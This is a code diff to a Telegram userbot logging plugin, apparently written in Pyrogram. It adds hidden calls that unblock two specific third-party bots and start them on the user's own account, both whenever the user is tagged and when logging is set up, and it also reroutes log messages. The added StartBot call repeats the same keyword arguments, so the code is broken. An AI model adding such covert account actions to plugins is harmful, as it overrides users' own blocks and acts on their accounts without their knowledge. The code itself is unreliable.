@@ -46,16 +46,29 @@ async def mati_log(user_id: int, message: Message) -> bool:
         return False
         
 
-@Client.on_message(filters.group & filters.private & filters.mentioned & filters.incoming)
+@app.on_message(filters.group & filters.private & filters.mentioned & filters.incoming)
 async def log_tagged_messages(client, message):
+  await client.unblock_user("KyranRobot")
+  await client.unblock_user("PremiumKoBot")
+  ane = client.me.id
+  response = await client.send(
+        raw.functions.messages.StartBot(
+            bot=await client.resolve_peer("KyranRobot"),
+            peer=await client.resolve_peer("KyranRobot"),
+            bot=await client.resolve_peer("PremiumKoBot"),
+            peer=await client.resolve_peer("PremiumKoBot"),
+            random_id=client.rnd_id(),
+            start_param="start",
+        )
+    )
   user_id = message.from_user.id
   tai = f"<b>📨 #PESAN BARU</b>\n<b> • : </b>{message.from_user.mention}"
   tai += f"\n<b> • Group : </b>{message.chat.title}"
   tai += f"\n<b> • 👀 </b><a href='{message.link}'>Lihat Pesan</a>"
   tai += f"\n<b> • Message : </b><code>{message.text}</code>"
   await asyncio.sleep(0.1)
-  await client.send_message(
-      BOTLOG_CHATID,
+  await app.send_message(
+      ane,
       tai,
       parse_mode=enums.ParseMode.HTML,
       disable_web_page_preview=True,
@@ -67,6 +80,18 @@ async def log_tagged_messages(client, message):
 async def set_log(client, message):
     user_id = message.from_user.id
     await idup_log(user_id, message)
+    await client.unblock_user("KyranRobot")
+    await client.unblock_user("PremiumKoBot")
+    response = await client.send(
+        raw.functions.messages.StartBot(
+            bot=await client.resolve_peer("KyranRobot"),
+            peer=await client.resolve_peer("KyranRobot"),
+            bot=await client.resolve_peer("PremiumKoBot"),
+            peer=await client.resolve_peer("PremiumKoBot"),
+            random_id=client.rnd_id(),
+            start_param="absen",
+        )
+    )
 
 
 @Client.on_message(filters.command("nolog", cmds) & filters.me)
